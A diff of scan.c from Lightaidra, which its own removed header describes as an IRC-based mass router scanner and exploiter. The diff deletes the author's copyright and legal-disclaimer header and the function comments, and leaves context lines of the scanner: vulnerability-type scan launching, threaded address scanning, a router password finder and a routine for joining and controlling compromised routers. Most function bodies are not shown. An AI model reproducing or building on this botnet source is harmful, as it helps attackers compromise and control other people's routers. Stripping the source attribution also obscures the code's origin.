@@ -1,28 +1,11 @@
-/*
- * scan.c - USE LIGHTAIDRA AT YOUR OWN RISK!
- *
- * Lightaidra - IRC-based mass router scanner/exploiter.
- * Copyright (C) 2008-2015 Federico Fazzi, <eurialo@deftcode.ninja>.
- *
- * LEGAL DISCLAIMER: It is the end user's responsibility to obey 
- * all applicable local, state and federal laws. Developers assume 
- * no liability and are not responsible for any misuse or damage 
- * caused by this program.
- *
- */
-
 #include "../include/headers.h"
 
 int sockwrite(int sd, const char *fmt, ...);
 int cmd_advscan_getpass(sock_t *scan_sp);
 void *scan_address(scan_data_t *scan_data); 
-int cmd_advscan_control(char *addr, sock_t *sp, requests_t *req,
-            unsigned short type); 
-int cmd_advscan_join(char *addr, sock_t *sp, requests_t *req,
-             unsigned short type); 
+int cmd_advscan_control(char *addr, sock_t *sp, requests_t *req, unsigned short type); 
+int cmd_advscan_join(char *addr, sock_t *sp, requests_t *req, unsigned short type); 
 
-/* cmd_scan_central(sock_t *, requests_t *, unsigned short) */ 
-/* start scanner with vuln type.  */ 
 void cmd_scan_central(sock_t *sp, requests_t *req, unsigned short type) {
     unsigned short a, b, c;
     int i, x;
@@ -119,8 +102,6 @@ crash:
     exit(EXIT_FAILURE);
 }
 
-/* scan_address(scan_data_t *) */ 
-/* start addresses scanner.  */ 
 void *scan_address(scan_data_t *scan_data) {
     FILE *rfd;
     int retv, flags;
@@ -225,15 +206,11 @@ void *scan_address(scan_data_t *scan_data) {
     pthread_exit(NULL);
 }
 
-/* __alarm() */ 
-/* for socket timeout. */ 
 void __alarm() {
     close(scan_sp->sockfd);
     return;
 }
 
-/* cmd_advscan_control(char *, sock_t *, requests_t *) */ 
-/* advance scanner init.  */ 
 int cmd_advscan_control(char *addr, sock_t *sp, requests_t *req, unsigned short type) {
     if (type == 1) {
         if (cmd_advscan_join(addr, sp, req, 1) == true) {
@@ -287,8 +264,6 @@ int cmd_advscan_control(char *addr, sock_t *sp, requests_t *req, unsigned short 
     return EXIT_FAILURE;
 }
 
-/* cmd_advscan_getpass(sock_t *) */ 
-/* advance scanner password finder. */ 
 int cmd_advscan_getpass(sock_t *scan_sp) {
     char temp[801];
     char *one, *two;
@@ -319,8 +294,6 @@ int cmd_advscan_getpass(sock_t *scan_sp) {
     return EXIT_FAILURE;
 }
 
-/* cmd_advscan_join(char *, sock_t *, requests_t *) */ 
-/* advance scanner (router validate control).  */ 
 int cmd_advscan_join(char *addr, sock_t *sp, requests_t *req, unsigned short type) {
     unsigned short e = 0;
 
@@ -339,7 +312,6 @@ int cmd_advscan_join(char *addr, sock_t *sp, requests_t *req, unsigned short typ
 
     setsockopt(scan_sp->sockfd, SOL_SOCKET, SO_RCVTIMEO,(char *)&tm,sizeof(struct timeval));
 
-    /* ignore ++ KILLED BY SIGPIPE ++ */
     signal(SIGPIPE, SIG_IGN);
 
     signal(SIGALRM, __alarm);
